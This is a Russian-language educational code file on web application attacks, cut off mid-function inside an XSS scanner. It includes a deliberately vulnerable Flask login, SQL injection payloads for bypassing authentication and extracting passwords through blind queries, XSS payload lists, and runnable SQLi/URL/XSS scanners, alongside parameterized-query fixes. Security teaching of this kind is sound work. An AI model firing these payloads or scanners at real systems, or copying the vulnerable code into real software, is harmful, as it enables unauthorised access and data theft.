# =======================================================================================================================================
# Атаки на приложения - это один из основных аспектов хакинга, который фокусируется на поиске уязвимостей в программном обеспечении и 
# веб-приложениях с целью получения несанкционированного доступа к данным или выполнения нежелательных операций.
# ========================================================================================================================================

# 1. Hack The Вох (НТВ)
# Hack The Вох - это популярная платформа для практики в области кибер­безопасности, которая предоставляет виртуальные машины и реальные 
# сценарии для взлома. Пользователи могут выполнять различные задачи, такие как обнаружение уязвимостей, эксплуатация, привилегированные
# атаки и многое другое.

# 2. TryHackMe
# TryHackМe - это интерактивная платформа для изучения и практики кибербезопасности. Она предлагает различные учебные комнаты и сце­нарии, 
# которые охватывают широкий спектр тем, включая веб-атаки, сетевую безопасность и цифровую криминалистику.

# 3. ОWASP WebGoat
# OWASP WebGoat - это учебное приложение с намеренно оставленными уязвимостями, которое позволяет пользователям изучать и практиковать 
# различные веб-атаки. Оно включает в себя различные уроки и задания по безопасности веб-приложений.

# 4. Damn VulneraЫe Web Application (DVWA)
# DVWA - это намеренно уязвимое веб-приложение, созданное для обу­чения и тестирования навыков по безопасности веб-приложений. 
# Оно включает в себя множество задач разного уровня сложности, от простых до сложных.

# 5. PortSwigger Web Security Academy
# PortSwigger Web Security Academy предоставляет интерактивные учеб­ные материалы и лаборатории для изучения и практики атак на веб­приложения. 
# Платформа охватывает множество тем, включая SQL­-инъекции, XSS, CSRF и другие.

# 6. PentesterLab
# PentesterLab предлагает упражнения и сценарии для обучения тестирова­нию на проникновение и веб-безопасности. 
# Платформа охватывает ши­рокий спектр тем и включает в себя практические задания с использова­нием реальных уязвимостей.

# 7. HackThisSite
# HackThisSite - это бесплатная учебная платформа для изучения и прак­тики хакерских навыков. Она предлагает различные уровни задач и сце­нариев, 
# которые помогают пользователям изучать основы безопасности и атак на веб-приложения.

# ============================================== Основы по базам данных ============================================================

# База данных (БД) - это организованный набор данных, хра­нимых и управляемых таким образом, чтобы облегчить доступ к информации, 
# её манипуляцию и обновление. Базы данных ис­пользуются в различных приложениях, от веб-сайтов и бизнес­-приложений до научных 
# исследований и управления корпора­тивными данными.

# Основные понятия и термины SQL
# SQL (Structured Query Language) - это язык программирования, используемый для управления и манипуляции реляционными базами данных. 
# Он позволяет выполнять следующие основные операции:
# DML (Data Manipulation Language): Операции манипуляции данными.
# SELECT - извлечение данных из таблицы.
# INSERT - вставка новых данных в таблицу.
# UPDATE - обновление существующих данных в таблице.
# DELETE - удаление данных из таблицы.

# DDL (Data Definition Language): Операции определения данных.
# CREATE - создание объектов базы данных, таких как таблицы, индексы и базы данных.
# ALTER - изменение структуры существующих объектов базы данных.
# DROP - удаление объектов базы данных.

# DCL (Data Control Language): Операции управления доступом.
# GRA Т - предоставление прав пользователям или ролям.
# REVOKE- отзыв ранее предоставленных прав.

# TCL (Transaction Control Language): Операции управления транзакциями.
# СОММП- фиксация изменений, выполненных в рамках транзакции.
# ROLLBACK - откат изменений, выполненных в рамках транзакции.
# SAVEPOINT - создание точки сохранения внутри транзакции, к которой можно вернуться.

# Запросы SQL
# SQL-запросы используются для взаимодействия с базой данных. Они могут быть простыми и сложными, включающими несколько таблиц и операций.
# SELECT * FROM users WHERE age > 18;

# Объединение таблиц (JOIN)
# INNER JOIN - возвращает только совпадающие записи из обеих таблиц.
# LEFT JOIN - возвращает все записи из левой таблицы и совпадающие записи из правой таблицы.
# RIGHT JOIN - возвращает все записи из правой таблицы и совпадаю­щие записи из левой таблицы.
# FULL JOIN - возвращает все записи, когда есть совпадение в левой или правой таблице.

# ==================================================== Внедрение SQL-инъекций ========================================================

# SQL-инъекция - это тип атаки, при которой злоумышлен­ник использует SQL-запросы для получения доступа к данным в базе данных или выполнения 
# операций над ними. Основная уязвимость возникает, когда приложение некорректно обраба­тывает пользовательский ввод и позволяет вставку 
# SQL-кoдa в SQL-зanpocы.

# SELECT * FROM users WHERE username = 'admin' AND password = 'password'
# Если злоумышленник введет в поле пароля следующее значение: password' OR '1'='1, то SQL-зaпpoc примет следующий вид:
# SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR '1' = '1'
# Что приведет к выборке всех записей из таблицы пользователей, так как условие 1 = 1 всегда истинно.

# SQL-инъекции
# Предположим, у нас есть форма входа на веб-сайте, где пользователь вво­дит свои учетные данные. 
# SQL-зaпpoc для проверки введенных данных мо­жет выглядеть примерно так:
# SELECT * FROM users WHERE username = 'введенное_имя' AND password = 'введенный_пароль';

# Злоумышленник может ввести в поле "Имя пользователя" следующее значение: admin' --
# Теперь SQL-зaпpoc будет выглядеть так:
# SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'введенный_пароль';

# пример кода, который демонстрирует уязвимость веб-приложения к SQL-инъекциям:
import sqlite3

# Подключение к базе данных SQLite
conn = sqlite3.connect('example.db')
cursor = conn.cursor()

# Получение имени пользователя из ввода
username = input("Введите имя пользователя: ")

# Формирование SQL-зaпpoca
sql_query = "SELECT * FROM users WHERE username = '{}'".format(username)

# Выполнение SQL-зaпpoca
cursor.execute(sql_query)

# Получение результатов запроса
results = cursor.fetchall()

# Вывод результатов
for row in results:
    print(row)

# Закрытие соединения
conn.close()

# пример, как можно исправить уязвимый код
import sqlite3

# Подключение к базе данных SQLite
conn = sqlite3.connect('example.db')
cursor = conn.cursor()

# Получение имени пользователя из ввода
username = input("Введите имя пользователя: ")

# Формирование SQL-зaпpoca с использованием параметризованного запроса
sql_query = "SELECT * FROM users WHERE username = ?"

# Выполнение SQL-зaпpoca с использованием параметризации
cursor.execute(sql_query, (username,))

# Получение результатов запроса
results = cursor.fetchall()

# Вывод результатов
for row in results:
    print(row)

# Закрытие соединения
conn.close()

# ======================================================================================================================================

# Создание уязвимого веб-приложения:
# Установите необходимые зависимости: pip install flask
# SQL-запрос превратится в: SELECT * FROM users WHERE username='admin' --' AND password='...'
# Запрос: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'

from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Небезопасно в реальном приложении

# Инициализация базы данных
def init_db():
    if not os.path.exists('database.db'):
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        
        # Создание таблицы пользователей
        c.execute('''CREATE TABLE users
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     username TEXT UNIQUE,
                     password TEXT)''')
        
        # Добавление тестового пользователя
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
                 ('admin', 'password123'))
        
        conn.commit()
        conn.close()

init_db()

# Уязвимая функция проверки логина
def check_credentials(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # ОПАСНО: прямое включение пользовательского ввода в SQL-запрос
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Выполняется запрос: {query}")  # Для демонстрации
    
    c.execute(query)
    user = c.fetchone()
    conn.close()
    
    return user is not None

@app.route('/')
def home():
    if 'username' in session:
        return f"Добро пожаловать, {session['username']}! <a href='/logout'>Выйти</a>"
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if check_credentials(username, password):
            session['username'] = username
            return redirect(url_for('home'))
        else:
            return "Неверные учетные данные. <a href='/login'>Попробовать снова</a>"
    
    return '''
        <h1>Вход в систему</h1>
        <form method="post">
            Логин: <input type="text" name="username"><br>
            Пароль: <input type="password" name="password"><br>
            <input type="submit" value="Войти">
        </form>
    '''

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug = True)

# Используйте параметризованные запросы:
# Безопасная версия
def check_credentials_safe(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
    user = c.fetchone()
    conn.close()
    return user is not None

# Хешируйте пароли (никогда не храните их в открытом виде):
import hashlib

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# При регистрации
hashed_pw = hash_password(password)
c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed_pw))

# При проверке
input_hash = hash_password(password)
c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, input_hash))

# ===================================================================================================================================

# Обнаружение SQL-инъекций:
# Тестирование веб-приложения на уязвимость к SQL-инъекциям
# Всегда используйте параметризованные запросы:
# НЕПРАВИЛЬНО (уязвимо):
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")

# ПРАВИЛЬНО (безопасно):
cursor.execute("SELECT * FROM users WHERE username=?", (username,))

# Для более полного тестирования можно попробовать:
# ' OR 1=1 --
# ' OR 'a'='a
# ' OR 1=1; --
# ' OR '1'='1' /*
# admin' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --
# ' UNION SELECT 1,@@version,3,4 --
# '; WAITFOR DELAY '0:0:10' --

# =====================================================================================================================================

# Эксплуатация SQL-инъекций для обхода аутентификации:
# Исходный запрос: SELECT * FROM users WHERE username='[логин]' AND password='[пароль]'
# После подстановки: SELECT * FROM users WHERE username='admin' --' AND password='123'
# Фактически выполняется: SELECT * FROM users WHERE username='admin'
# Исходный запрос: SELECT * FROM users WHERE username='[логин]' AND password='[пароль]'
# После подстановки: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='123'
# Давайте протестируем это на нашем уязвимом приложении:
# Код из нашего уязвимого приложения
def check_credentials(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # Уязвимый запрос
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Выполняется запрос: {query}")  # Для демонстрации
    
    c.execute(query)
    user = c.fetchone()
    conn.close()
    
    return user is not None

# При вводе admin' --: Выполняется запрос: SELECT * FROM users WHERE username='admin' --' AND password='123'
# При вводе ' OR 1=1 --: Выполняется запрос: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='123'

# Решение 1: Параметризованные запросы
def check_credentials_safe(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # Безопасный запрос с параметрами
    query = "SELECT * FROM users WHERE username=? AND password=?"
    c.execute(query, (username, password))
    
    user = c.fetchone()
    conn.close()
    
    return user is not None

# Решение 2: Использование ORM
from sqlalchemy import create_engine, text

def check_credentials_orm(username, password):
    engine = create_engine('sqlite:///database.db')
    
    # Безопасный запрос через SQLAlchemy
    query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
    
    with engine.connect() as conn:
        result = conn.execute(query, {"user": username, "pass": password})
        return result.fetchone() is not None
    
# ==========================================================================================================================================

# SQL-инъекции типа Boolean-based Blind:
# $user = $_GET['username']; // Уязвимый параметр
# $query = "SELECT * FROM users WHERE username = '$user'";
# $result = mysqli_query($conn, $query);

# Злоумышленник может последовательно угадывать данные, например: 
# admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--

# Защита от Boolean-based Blind SQL-инъекций
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
# $stmt->bind_param("s", $user);
# $stmt->execute();

# =========================================================================================================================================

# SQL-инъекции типа Time-based Blind:
#  Создание уязвимого веб-приложения (PHP + MySQL)
# <?php
# // Уязвимый код с Time-based Blind SQL-инъекцией
# $conn = new mysqli("localhost", "user", "password", "test_db");

# if ($conn->connect_error) {
#     die("Connection failed: " . $conn->connect_error);
# }

# $username = $_GET['username'];
# $query = "SELECT * FROM users WHERE username = '$username'";
# $result = $conn->query($query);

# if ($result->num_rows > 0) {
#     echo "User exists";
# } else {
#     echo "User not found";
# }

# $conn->close();
# ?>

# Базовый тест на уязвимость: admin' AND SLEEP(5)--
# Условная задержка: 
# admin' AND IF(1=1,SLEEP(5),0)--
# admin' AND IF(1=2,SLEEP(5),0)--
# Определение длины пароля: admin' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=10,SLEEP(5),0)--
# Постепенное извлечение данных: admin' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97,SLEEP(5),0)--

# Использование подготовленных выражений
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
# $stmt->bind_param("s", $username);
# $stmt->execute();

# ==========================================================================================================================================

# Защита от SQL-инъекций:

# PHP (MySQLi):
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
# $stmt->bind_param("ss", $username, $password);
# $stmt->execute();
# $result = $stmt->get_result();

# PHP (PDO):
# $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
# $stmt->execute([':username' => $username]);
# $user = $stmt->fetch();

# Python (SQLite3):
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# Java (JDBC):
# PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
# stmt.setString(1, username);
# ResultSet rs = stmt.executeQuery();

# PHP (Eloquent Laravel): $user = User::where('username', $username)->first();
# Python (SQLAlchemy): user = session.query(User).filter_by(username=username).first()
# Node.js (Sequelize): const user = await User.findOne({ where: { username } });
# C# (Entity Framework): var user = context.Users.FirstOrDefault(u => u.Username == username);

# Валидация входных данных:
# if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
#     die("Invalid username format");
# }

# Экранирование специальных символов: $safe_input = $conn->real_escape_string($user_input);

# Логирование и мониторинг
# Логирование подозрительных запросов
# if (preg_match('/(union|select|insert|delete|update|drop|alter)/i', $_SERVER['QUERY_STRING'])) {
#     file_put_contents('security.log', date('Y-m-d H:i:s')." - Possible SQLi: ".$_SERVER['REQUEST_URI']."\n", FILE_APPEND);
# }

# Пример полной защищенной реализации (PHP + PDO)
# <?php
# // Конфигурация БД
# $pdo = new PDO('mysql:host=localhost;dbname=test_db', 'user', 'password', [
#     PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
#     PDO::ATTR_EMULATE_PREPARES => false
# ]);

# // Валидация ввода
# if (!preg_match('/^[a-z0-9]{3,20}$/i', $_POST['username'])) {
#     die("Invalid username format");
# }

# // Параметризованный запрос
# $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND status = 'active'");
# $stmt->execute([':username' => $_POST['username']]);
# $user = $stmt->fetch();

# if ($user && password_verify($_POST['password'], $user['password_hash'])) {
#     // Успешная аутентификация
# } else {
#     // Ошибка аутентификации
# }
# ?>

# ============================================================================================================================================

# Пример использования Bandit:
import bandit
import bandit.core.manager
manager = bandit.core.manager.BanditManager()
manager.run_tests(['example.py'])
results = manager.results
for issue in results.issues:
    print(issue)

# Пример использования OWASP ZAP с Python:
import requests
zap_url = 'http://localhost:8080'
target_url = 'http://example.com'

# Запуск сканирования
requests.get(f'{zap_url}/JSON/ascan/action/scan/?url={target_url} ')

# Проверка статуса сканирования
status = requests.get(f'{zap_url}/JSON/ascan/view/status/')
print('Сканирование завершено на', status.json() ['status'], '%')

# Проверка на SQL-инъекции
import requests

# Отправка запроса с потенциа�ьно уязвимыми данными
payload = "' OR '1'='1"
response = requests.get('https://www.example.com/login?username=' + payload)

# Анализ ответа на предмет изменений в поведении приложения
if 'Вы успешно вошли в систему' in response.text:
    print('Уязвимость на сайте:', response.url)

# Поиск утечек информации в URL
import requests

# Перебор URL с возможными утечками информации
for i in range(1, 101):
    url = f'https://www.example.com/page?id={i}'
    response = requests.get(url)

    # Проверка ответа на наличие конфиденциальной информации
    if 'Конфиденциальные данные' in response.text:
        print('Обнаружена уязвимость на странице:', url)

# ============================================================================================================================================

# Программа для тестирования SQL-инъекций на Python
import requests
from urllib.parse import urljoin
from time import sleep
import argparse

class SQLiTester:
    def __init__(self, target_url, verbose = False):
        self.target_url = target_url
        self.verbose = verbose
        self.vulnerable = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLiTester/1.0',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        
        # Базовые payload'ы для разных типов SQL-инъекций
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' UNION SELECT null,username,password FROM users--",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR IF(1=1,1,0)--",
                "' OR IF(1=2,1,0)--"
            ],
            'time_based': [
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=2,SLEEP(5),0)--",
                "'; WAITFOR DELAY '0:0:5'--"
            ]
        }

    def test_parameter(self, param_name, param_value, method = 'GET'):
        """
        Тестирует один параметр на уязвимость к SQL-инъекциям
        """
        results = []
        
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                test_value = param_value + payload
                
                if method.upper() == 'GET':
                    params = {param_name: test_value}
                    response = self.session.get(self.target_url, params = params)
                else:
                    data = {param_name: test_value}
                    response = self.session.post(self.target_url, data = data)
                
                # Анализ ответа
                is_vulnerable = self.analyze_response(response, category)
                
                if is_vulnerable:
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'type': category,
                        'status': 'VULNERABLE',
                        'response_time': response.elapsed.total_seconds(),
                        'status_code': response.status_code
                    })
                    self.vulnerable = True
                else:
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'type': category,
                        'status': 'not vulnerable',
                        'response_time': response.elapsed.total_seconds(),
                        'status_code': response.status_code
                    })
                
                if self.verbose:
                    print(f"Testing {param_name}={test_value} -> {results[-1]['status']}")
                
                # Защита от блокировки
                sleep(0.5)
        
        return results

    def analyze_response(self, response, payload_type):
        """
        Анализирует ответ сервера на признаки уязвимости
        """
        # Проверка на ошибки SQL в ответе
        sql_errors = [
            'SQL syntax',
            'MySQL server version',
            'unclosed quotation mark',
            'syntax error',
            'ODBC Driver',
            'ORA-',
            'PostgreSQL',
            'Microsoft Access'
        ]
        
        # Для boolean-based инъекций
        original_response = self.session.get(self.target_url).text
        test_response = response.text
        
        # Для time-based инъекций
        response_time = response.elapsed.total_seconds()
        
        if payload_type == 'error_based':
            # Проверяем наличие SQL-ошибок в ответе
            return any(error in response.text for error in sql_errors)
        
        elif payload_type == 'boolean_based':
            # Сравниваем ответы на TRUE и FALSE условия
            return original_response != test_response
        
        elif payload_type == 'time_based':
            # Проверяем задержку ответа
            return response_time > 5
        
        return False

    def scan_form(self, form_action, inputs):
        """
        Сканирует HTML-форму на уязвимости
        """
        results = []
        method = 'POST'  # По умолчанию, можно добавить определение метода
        
        for input_name in inputs:
            if input_name.lower() in ['submit', 'csrf_token']:
                continue
                
            test_value = f"test_{input_name}"
            res = self.test_parameter(input_name, test_value, method)
            results.extend(res)
        
        return results

def main():
    parser = argparse.ArgumentParser(description = 'SQL Injection Scanner')
    parser.add_argument('-u', '--url', required = True, help = 'Target URL')
    parser.add_argument('-p', '--parameter', help = 'Parameter to test')
    parser.add_argument('-v', '--verbose', action = 'store_true', help = 'Verbose output')
    args = parser.parse_args()
    
    tester = SQLiTester(args.url, verbose = args.verbose)
    
    if args.parameter:
        results = tester.test_parameter(args.parameter, 'test')
    else:
        # Если параметр не указан, делаем базовый тест
        results = tester.test_parameter('id', '1')
    
    print("\nScan Results:")
    print("="*50)
    for result in results:
        if result['status'] == 'VULNERABLE':
            print(f"[!] {result['parameter']} is VULNERABLE to {result['type']} SQLi")
            print(f"    Payload: {result['payload']}")
            print(f"    Response code: {result['status_code']}")
            print(f"    Response time: {result['response_time']}s")
            print("-"*50)
    
    if not tester.vulnerable:
        print("[+] No SQL injection vulnerabilities found")

if __name__ == '__main__':
    main()

# Базовый тест: python sql_scanner.py -u "http://example.com/page.php?id=1"
# Тест конкретного параметра: python sql_scanner.py -u "http://example.com/login.php" -p username
# Подробный вывод: python sql_scanner.py -u "http://example.com/search.php" -p query -v

# ===========================================================================================================================================

# Скрипт для анализа URL-адресов веб-приложения на уязвимости
# Установка зависимостей: pip install requests beautifulsoup4
# Запуск сканера: python url_scanner.py -u "https://example.com" -o results.json

import requests
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import time
import argparse
import json

class URLScanner:
    def __init__(self, base_url, output_file = "scan_results.json"):
        self.base_url = base_url
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ScannerBot/1.0",
        })
        self.vulnerabilities = []

    def get_links_from_page(self, url):
        """Извлекает все ссылки со страницы"""
        try:
            response = self.session.get(url, timeout = 5)
            soup = BeautifulSoup(response.text, "html.parser")
            links = set()
            
            for link in soup.find_all("a", href = True):
                href = link["href"]
                full_url = urljoin(url, href)
                if full_url.startswith(self.base_url):
                    links.add(full_url)
            
            return links
        except Exception as e:
            print(f"[!] Ошибка при получении ссылок: {e}")
            return set()

    def scan_url(self, url):
        """Проверяет URL на уязвимые параметры"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            return

        print(f"\n[🔍] Анализ URL: {url}")

        for param in query_params:
            print(f"  [*] Проверка параметра: {param}")
            
            # Тесты на SQL-инъекции
            if self.test_sql_injection(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "SQL Injection",
                    "payload": "SQLi Test Payload"
                })
            
            # Тесты на XSS
            if self.test_xss(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "XSS",
                    "payload": "XSS Test Payload"
                })
            
            # Проверка на IDOR (если параметр содержит ID)
            if "id" in param.lower() or "user" in param.lower():
                if self.test_idor(url, param):
                    self.vulnerabilities.append({
                        "url": url,
                        "parameter": param,
                        "type": "IDOR",
                        "payload": "IDOR Test Payload"
                    })
            
            # Проверка на утечки информации (debug, token, etc.)
            if self.test_info_leak(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "Information Leakage",
                    "payload": "Debug/Token Found"
                })

    def test_sql_injection(self, url, param):
        """Проверка параметра на SQL-инъекции"""
        test_payloads = [
            f"' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' ORDER BY 1--",
            "1 AND SLEEP(5)--"
        ]
        
        for payload in test_payloads:
            try:
                modified_url = url.replace(f"{param}=", f"{param}={payload}")
                response = self.session.get(modified_url, timeout = 10)
                
                # Если есть SQL-ошибки в ответе
                sql_errors = ["SQL syntax", "MySQL error", "unclosed quotation"]
                if any(error in response.text for error in sql_errors):
                    print(f"    [!] Обнаружена SQL-инъекция в параметре {param}")
                    return True
                
                # Для Time-based SQLi
                if "SLEEP" in payload and response.elapsed.total_seconds() > 3:
                    print(f"    [!] Возможна Time-based SQL-инъекция в параметре {param}")
                    return True
            except:
                continue
        
        return False

    def test_xss(self, url, param):
        """Проверка параметра на XSS"""
        test_payload = "<script>alert(1)</script>"
        modified_url = url.replace(f"{param}=", f"{param}={test_payload}")
        
        try:
            response = self.session.get(modified_url, timeout = 5)
            if test_payload in response.text:
                print(f"    [!] Обнаружена XSS-уязвимость в параметре {param}")
                return True
        except:
            pass
        
        return False

    def test_idor(self, url, param):
        """Проверка на Insecure Direct Object Reference"""
        test_value = "12345"  # Подмена ID
        modified_url = url.replace(f"{param}=", f"{param}={test_value}")
        
        try:
            response = self.session.get(modified_url, timeout = 5)
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"    [!] Возможна IDOR-уязвимость в параметре {param}")
                return True
        except:
            pass
        
        return False

    def test_info_leak(self, url, param):
        """Проверка на утечки информации"""
        sensitive_keywords = ["debug", "token", "secret", "password"]
        
        if any(keyword in param.lower() for keyword in sensitive_keywords):
            print(f"    [!] Параметр {param} может содержать утечку данных")
            return True
        
        return False

    def crawl_and_scan(self, max_pages = 10):
        """Рекурсивный обход и сканирование URL"""
        visited = set()
        queue = [self.base_url]
        
        while queue and len(visited) < max_pages:
            current_url = queue.pop(0)
            
            if current_url in visited:
                continue
            
            visited.add(current_url)
            self.scan_url(current_url)
            
            # Добавляем новые ссылки в очередь
            new_links = self.get_links_from_page(current_url)
            queue.extend(new_links - visited)
            
            time.sleep(1)  # Защита от блокировки

    def save_results(self):
        """Сохраняет результаты в JSON"""
        with open(self.output_file, "w", encoding = "utf-8") as f:
            json.dump(self.vulnerabilities, f, indent = 4)
        
        print(f"\n[✅] Результаты сохранены в {self.output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "Сканер уязвимостей URL")
    parser.add_argument("-u", "--url", required = True, help = "Базовый URL для сканирования")
    parser.add_argument("-o", "--output", default = "scan_results.json", help = "Файл для сохранения результатов")
    parser.add_argument("-m", "--max-pages", type = int, default = 10, help = "Максимальное количество страниц для сканирования")
    args = parser.parse_args()
    
    scanner = URLScanner(args.url, args.output)
    scanner.crawl_and_scan(args.max_pages)
    scanner.save_results()

# Результаты сохраняются в JSON:
[
    {
        "url": "https://example.com/profile?id=1",
        "parameter": "id",
        "type": "SQL Injection",
        "payload": "' OR '1'='1"
    }
]

# ===========================================================================================================================================

# XSS Scanner: Утилита для обнаружения межсайтового скриптинга (XSS)
# Установите зависимости: pip install requests beautifulsoup4
# Запустите сканер: python xss_scanner.py -u https://example.com -o results.json -d 3

import requests
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
import argparse
import json
import re
import html

class XSSScanner:
    def __init__(self, target_url, output_file = "xss_results.json"):
        self.target_url = target_url
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (XSS-Scanner/1.0)",
            "Accept": "text/html,application/xhtml+xml"
        })
        self.vulnerabilities = []
        self.tested_urls = set()
        
        # Коллекция XSS payload'ов для разных контекстов
        self.payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # DOM-based XSS
            "javascript:alert('XSS')",
            "\" onmouseover=\"alert('XSS')",
            "'-alert('XSS')-'",
            
            # Obfuscated XSS
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            
            # Advanced vectors
            "<iframe src=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed code=\"javascript:alert('XSS')\">"
        ]

    def scan_url(self, url):
        """Сканирует URL на XSS уязвимости"""
        if url in self.tested_urls:
            return
        self.tested_urls.add(url)
        
        print(f"[*] Проверка: {url}")
        
        # Проверка отраженного XSS в параметрах URL
        parsed = urlparse(url)
        if parsed.query:
            self.test_reflected_xss(url)
        
        # Проверка хранимого XSS в формах
        self.test_stored_xss(url)
        
        # Проверка DOM-based XSS
        self.test_dom_xss(url)

    def test_reflected_xss(self, url):
        """Тестирование отраженного XSS в параметрах URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            original_value = params[param][0]
            
            for payload in self.payloads:
                # Подменяем значение параметра на XSS payload
                modified_query = parsed.query.replace(
                    f"{param}={original_value}", 
                    f"{param}={quote(payload)}"
                )
                modified_url = parsed._replace(query = modified_query).geturl()
                
                try:
                    response = self.session.get(modified_url, timeout = 10)
                    
                    # Проверяем, был ли payload выполнен
                    if self.is_xss_successful(response, payload):
                        self.report_vulnerability(
                            url = url,
                            param = param,
                            payload = payload,
                            type = "Reflected XSS",
                            context = "URL Parameter"
                        )
                        break
                
                except Exception as e:
                    print(f"[!] Ошибка при тестировании {param}: {e}")

    def test_stored_xss(self, url):
        """Тестирование хранимого XSS через формы"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = self.get_form_details(form)
                form_url = urljoin(url, form_details["action"])
                
                # Подготовка данных формы с XSS payload
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden":
                        data[input_tag["name"]] = input_tag["value"]
                    elif input_tag["type"] != "submit":
                        # Вставляем payload в каждое поле
                        data[input_tag["name"]] = self.payloads[0]
                
                # Отправка формы
                if form_details["method"] == "post":
                    response = self.session.post(form_url, data = data)
                else:
                    response = self.session.get(form_url, params = data)
                
                # Проверка на хранимый XSS
                if self.is_xss_successful(response, self.payloads[0]):
                    self.report_vulnerability(
                        url = url,
                        param = "Form input",
                        payload = self.payloads[0],
                        type = "Stored XSS",
                        context = f"Form at {form_url}"
                    )
        
        except Exception as e:
            print(f"[!] Ошибка при тестировании форм: {e}")

    def test_dom_xss(self, url):
        """Тестирование DOM-based XSS"""
        try:
            response = self.session.get(url)
            
            # Ищем опасные функции в JavaScript
            dom_patterns = [
                r"document\.write\(.*\)",
                r"innerHTML\s*=",
                r"eval\(.*\)",
                r"setTimeout\(.*\)",
                r"location\.hash"
            ]
            
            for pattern in dom_patterns:
                if re.search(pattern, response.text):
                    self.report_vulnerability(
                        url = url,
                        param = "DOM Operation",
                        payload = pattern,
                        type = "Potential DOM-based XSS",
                        context = "JavaScript code"
                    )
                    break
        
        except Exception as e:
            print(f"[!] Ошибка при тестировании DOM: {e}")

    def get_form_details(self, form):
        """Извлекает детали HTML формы"""
        details = {
            "action": form.attrs.get("action", ""),
            "method": form.attrs.get("method", "get").lower(),
            "inputs": []
        }
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            details["inputs"].append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
        
        return details

    def is_xss_successful(self, response, payload):
        """Проверяет, был ли XSS payload успешно выполнен"""
        # Декодируем HTML-сущности для корректного сравнения
        decoded_payload = html.unescape(payload)
        
        # Проверяем разные признаки успешной XSS атаки
        conditions = [
            decoded_payload in response.text,  # Payload остался неизменным
            "alert('XSS')" in response.text,   # Нашли выполнение alert
